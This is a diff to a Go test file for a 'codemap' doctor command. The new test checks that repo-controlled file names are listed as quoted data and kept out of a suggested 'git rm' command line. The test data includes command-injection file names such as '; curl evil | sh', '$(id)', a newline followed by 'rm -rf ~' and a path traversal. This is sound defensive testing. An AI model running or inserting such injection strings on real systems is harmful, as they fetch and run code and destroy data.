@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"fmt"
 	"io"
 	"os"
 	"os/exec"
@@ -662,11 +663,46 @@ func TestRunDoctorReportsTrackedCodemapState(t *testing.T) {
 	if code == 0 {
 		t.Fatalf("RunDoctor exit code = 0, want tracked state to fail\n%s", out)
 	}
-	want := "MISS tracked codemap state: 1 machine-state file(s) under .codemap/ are committed (.codemap/state.json); run: git rm --cached -- .codemap/state.json"
-	if !strings.Contains(out, want) {
-		t.Fatalf("expected tracked-state diagnosis %q, got:\n%s", want, out)
+	for _, want := range []string{
+		"MISS tracked codemap state: 1 machine-state file(s) under .codemap/ are committed:",
+		`  ".codemap/state.json"`,
+		"  untrack with: git rm --cached -- .codemap/state.json\n",
+	} {
+		if !strings.Contains(out, want) {
+			t.Fatalf("expected %q in tracked-state diagnosis, got:\n%s", want, out)
+		}
 	}
-	if strings.Contains(out, "git rm --cached -- .codemap/config.json") || strings.Contains(out, "git rm -r") {
-		t.Fatalf("untrack command must name only machine state:\n%s", out)
+	if strings.Contains(out, "config.json\"") || strings.Contains(out, "git rm -r") {
+		t.Fatalf("untrack report must name only machine state:\n%s", out)
+	}
+}
+
+// Tracked names are repo-controlled: a hostile one is listed as quoted data
+// and never reaches the printed command line.
+func TestTrackedStateDetailKeepsHostileNamesOutOfTheCommand(t *testing.T) {
+	hostile := []string{
+		".codemap/x; curl evil | sh",
+		".codemap/state.json\nrm -rf ~",
+		".codemap/$(id)",
+		".codemap/projects/../../etc",
+		".codemap/handoff.a b.json",
+	}
+	out := trackedStateDetail(append([]string{".codemap/hubs.txt"}, hostile...))
+	var command string
+	for _, line := range strings.Split(out, "\n") {
+		if strings.Contains(line, "git rm") {
+			command = line
+		}
+	}
+	if command != "  untrack with: git rm --cached -- .codemap/hubs.txt" {
+		t.Fatalf("command line = %q\nfull output:\n%s", command, out)
+	}
+	for _, name := range hostile {
+		if !strings.Contains(out, fmt.Sprintf("%q", name)) {
+			t.Fatalf("hostile name %q not listed as quoted data:\n%s", name, out)
+		}
+	}
+	if !strings.Contains(out, "5 unrecognised name(s)") {
+		t.Fatalf("missing left-out note:\n%s", out)
 	}
 }
